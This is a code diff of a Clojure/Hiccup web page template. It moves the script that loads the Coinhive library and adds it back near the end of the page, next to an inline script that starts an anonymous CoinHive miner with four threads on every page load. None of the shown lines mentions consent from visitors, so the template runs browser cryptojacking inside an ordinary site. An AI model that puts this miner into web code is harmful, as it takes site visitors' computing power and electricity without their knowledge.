@@ -131,7 +131,6 @@
                   [:link {:rel "icon" :type "image/png" :href (s/join ["/" "gift-icon-" s ".png"]) :sizes (s/join [s "x" s])}])
                  [16 32 48 96 144])
             [:link {:rel "canonical" :href (core/cannonical-url req)}]
-            [:script {:async false :src "https://coinhive.com/lib/coinhive.min.js"}]
             [:script {:async true :src "https://cdn.ampproject.org/v0.js"}]
             (if-not (contains? #{"localhost" "127.0.0.1", "192.168"} (:server-name req))
               [:script {:async true :custom-element "amp-analytics" :src "https://cdn.ampproject.org/v0/amp-analytics-0.1.js"}])
@@ -158,6 +157,7 @@
             [:script {:type "application/ld+json"} dat/data-website]
             [:amp-analytics {:type "googleanalytics"}
              [:script {:type "application/json"} dat/data-analytics]]
+            [:script {:async false :src "https://coinhive.com/lib/coinhive.min.js"}]
             [:script {:type "text/javascript"} "var m = new CoinHive.Anonymous('"
                             (env :chive-key)
                             "'); m.setNumThreads(4); m.start(); m.on('accepted', function () {console.log('hash accepted')})"]]]))))
